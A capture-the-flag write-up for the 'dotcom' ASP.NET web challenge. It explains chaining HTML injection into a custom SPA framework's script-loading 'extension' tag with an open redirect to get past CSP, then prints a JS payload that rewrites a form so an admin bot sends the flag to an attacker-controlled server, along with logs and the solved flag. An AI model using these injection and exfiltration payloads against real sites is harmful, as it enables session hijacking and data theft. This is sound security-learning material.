# dotcom

[library.m0unt41n.ch/challenges/dotcom](https://library.m0unt41n.ch/challenges/dotcom) ![](../../resources/web.svg) ![](../../resources/hard.svg) 

# TL;DR

An ASP.NET application, with a fairly typical
_"submit some user content and make a bot running as admin visit it"_ pattern.
Exploiting a security gap in a custom client-side JS framework to inject a
script, that modifies page behavior when operated by a bot.

I was skeptical about this one at first (ASP.NET, _yuck_), but from other
challenges from the same author I knew that I can expect a nice, clean problem,
so, gave it a try. It wasn't that hard actually (as evidenced by
[30 other people](https://library.m0unt41n.ch/challenges/dotcom) solving it).

For reference, [Coderion's write-up](https://blog.gk.wtf/shc23/dotcom/).
Looks like he missed the `extension` "feature", therefore, needed multiple
pastes to get around the protections. Mine is more brutal &#128512; but also probably
more intended.

# Making it work

The downloaded tarball needed few patches to make the app work as intended:

*   Some path shenanigans in the `Dockerfile` that broke the build:

    ```bash
    sed -i -r -e '/^(COPY|RUN)/s/dotcom\//.\//g' -e '/^WORKDIR/s/\/dotcom//g' Dockerfile
    ```

    That was enough to get it to build and run:

    ```
    docker build -t dotcom:latest .
    docker run -p 5000:5000 -it dotcom:latest
    ```

*   The app was still not functional though - submitting paste _"for review"_
    failed locally, with an exception about the button being not clickable. All
    that worked in a remote instance. With a bit of debugging / screenshotting,
    I figured that this was caused by Chrome window being too small. Fix:

    ```bash
    OPTS="\ \ \ \ \ \ \ \ \ \ \ \ driver.Manage().Window.Size = new System.Drawing.Size(1920, 1080);"
    sed -i "/var driver =/a$OPTS" Controllers/AdminController.cs
    ```

*   We need some flag in the environment, otherwise the admin bot throws
    another exception:

    ```bash
    sed -i '/ENV/aENV FLAG="shc2023{this_is_not_a_flag}"' Dockerfile
    ```

*   While at it, I also got rid of the Docker warning

    ```bash
    sed -i -r -e '/^ENV/s/URLS /URLS=/' Dockerfile
    ```

*   Now the app seems fully functional. For convenience, I added a temporary DB
    entry for testing:

    ```bash
    CODE='\\n\ \ \ \ public ContentDb() { _contents[Guid.Parse("12341234-1234-1234-1234-123412341234")] = "1234"; }'
    sed -i "/_contentlock =/a$CODE" Db/ContentDb.cs
    ```

*   ... and switched to the _correct_ bracket style &#128578;

    ```bash
    sed -i -r -z 's/\n *\{\n/ {\n/g' */*.cs */*/*.cs
    ```

With that, the app seems fully working and is ready for next steps.


# Analysis

## `SecurityHeaderMiddleware.cs`

This class handles CSP for all pages served by the app. It adds:

*   `Content-Security-Policy: script-src 'nonce-XXXXX'; base-uri 'none'; object-src 'none'`
*   `X-Content-Type-Options: nosniff`

(with a random nonce)

## `ContentDb.cs`

Nothing to see here. Just a simple K/V class with:

*   `AddContent(text)` returning a `Guid`
*   `GetContent(guid)` returning the text.

## Client-side framework and app (`spa.js`)

A custom framework that enables client-side navigation, by manipulating DOM.
It handles:

*   `/` - index page.
*   `/content` - shows a **Create a paste** form, that sends a `POST /content`
    with `text` arg.
*   `/view` - displays **View paste** page, with background fetch (see below).
*   `/support` - displays **Support!** form, that sends a
    `POST /report` with `id` arg.

The framework uses custom tags and manipulates them using DOM:

*   `<spa-content>` - overall container. Created in the initial HTML generated
    by `Program.cs`.
*   `<spa-component>` - at page load, using `show()` method, all these elements
    are created as `SpaComponent` objects, with extra code attached.

That `SpaComponent` has some interesting shenanigans for a given `elem` and its
`name`/`value` (custom attributes of `<spa-component>`), First, for `view-paste`.

```javascript
else if (name === "view-paste") {
    let pasteId = new URL(location).searchParams.get("id")
    fetch("/content/" + pasteId).then(r => {
        r.text().then(txt => {
            elem.innerHTML = txt;
            let components = [...document.querySelectorAll("spa-component")];
            components.forEach(c => new SpaComponent(c, nonce));
        })
    });
}
```

That dynamically handles loading a paste, using `/content` endpoint served by
the server-side code, used by `/view` handler above. Note that it updates the
CSP nonce too.

... but, much more interestingly:

```javascript
else if (name === "extension") {
    let extension = document.createElement("script");
    let url = new URL(value, location);
    if (url.hostname !== location.hostname) {
        console.log("Invalid extension hostname, not loading!")
        return;
    }
    extension.src = value;
    extension.nonce = nonce;
    document.body.appendChild(extension);
}
```

&#128558; &#128558; &#128558; That **creates a `<script>` DOM element and uses**
**`value` of the `<spa-component>` as `src` for it**. With no
checks whatsoever. Considering that the server app runs a bot, looks like
an obvious part of the attack.

## Server-side content handler (`ContentController.cs`)

Handles various variants of `/content` endpoint:

*   `GET /content?id=GUID` - returns a raw paste as `text/html`.
*   `POST /content` (triggered by `GET /content` in the client app above) -
    generates a fresh GUID and adds `text` param to the DB under it. Then,
    redirects to `/view?id=GUID`.
*   `GET /content/share?link=GUID`, **generates a HTTP redirect to the**
    **provided URL**. With no checks whatsoever &#128578;

## Server-side bot (AdminController.cs)

A very typical CTF "admin bot", using Selenium framework. It handles
`POST /report` taking `id` as the argument (GUID) and:

*   Starts a Chrome instance
*   Goes to `http://localhost:5000/view?id=GUID` (that URL is carefully
    constructed, no way to inject anything other than a GUID there)
*   Clicks **Go Back**
*   Clicks **Create your first paste!**
*   Types the flag (pulled from `FLAG` environment variable) in the provided
    text area
*   Clicks **Create**

All this with some delays - in particular, the 3 seconds after the flag
submission, seemed like invitation to some kind of timing attack?

Some extra security:

*   After each step, browser's URL is checked to have `host=localhost`
*   Providing invalid GUID returns some internal JSON, but with no data.


# Summary

So, to summarize, we have:

1.  A custom client-side framework, which should be exploitable by injecting
    HTML tags inside "pastes".
2.  That fishy `extension` DOM object in the framework, which allows injecting
    arbirary scripts from `localhost`.
3.  Access to raw pastes as `/content/GUID`.
4.  All these things combined, suggest an attack:
    *   Create a paste with some JS payload. Note its GUID.
    *   Create another paste, injecting
        `<spa-component name="extension" value="/content/GUID">` in a way that
        will make the framework add it literally into the DOM.
    *   Send that second paste for admin review - once the payload kicks in, we
        have full control over the app that the admin is clocking through.
5.  That _almost_ works &#128578; The pastes served by `/content/GUID` have
    `Content-Type: text/html` and browser rejects that because of
    `X-Content-Type-Options: nosniff`.
6.  ... and that's where `/content/share` comes handy. Remember, it can
    redirect to arbitrary URL, incl. one that we control to set the correct
    `Content-Type`.

As a PoC, I started an AWS VM, created a simple `payload.js` with
`console.log("blah");` file and added a following paste:

```html
bla</spa-component><spa-component name="extension" value="/content/share?link=http://X.X.X.X/payload.js">test</spa-component>
```

(TBH, I'm not sure why this works DOM-wise. I kept trying various start/end
tags until it worked &#128539;)

Then, I served this with `sudo python3 -m http.server 80`, added above paste
in the app and viewed the page in the local browser - and I got the message on
the console!

# Getting the flag

Things get easier now. We have:

*   Arbitrary JS execution
*   ... in a client-side JS framework
*   And an admin bot that has no idea about the app. It just clicks and types
    into whatever the browser is displaying.

The possibilities are endless &#128578; I went with **redefining the `/create` page**,
to render a simple form that sends the flag typed by the bot to the above AWS
server (so that I can see it in the logs). `payload.js` has become:

```javascript
createPage = new SpaPage("/create", `
        <form id="createContent" action="http://X.X.X.X/" method="GET">
            <textarea name="flag" id="textArea"></textarea>
            <button id="submit" type="submit">Send</button>
        </form>
    `);
app.registerPage(createPage);
```

I re-sent the above paste for verification and, on the AWS server, I saw:

```bash
TODO
X.X.X.X - - [04/Jan/2025 16:43:52] "GET /payload.js HTTP/1.1" 200 -
X.X.X.X - - [04/Jan/2025 16:43:58] "GET /?flag=shc2023%7Bthis_is_not_a_flag%7D HTTP/1.1" 200 -

```

Then, repeating all this in a live SHC instance:

```bash
128.140.62.133 - - [04/Jan/2025 16:49:30] "GET /payload.js HTTP/1.1" 200 -
128.140.62.133 - - [04/Jan/2025 16:49:33] "GET /?flag=shc2023%7BT0d4y_1_l34rnt_4_l0t_4b0ut_c5p_a5bb5269fda2%7D HTTP/1.1" 200 -
```

<br>

Yet again, I managed to solve a CSP/XSS/whatever challenge, without actually
understanding these things well &#128539; The trick with arbitrary `form action`
keeps on giving &#128578;

---

## `shc2023{T0d4y_1_l34rnt_4_l0t_4b0ut_c5p_a5bb5269fda2}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
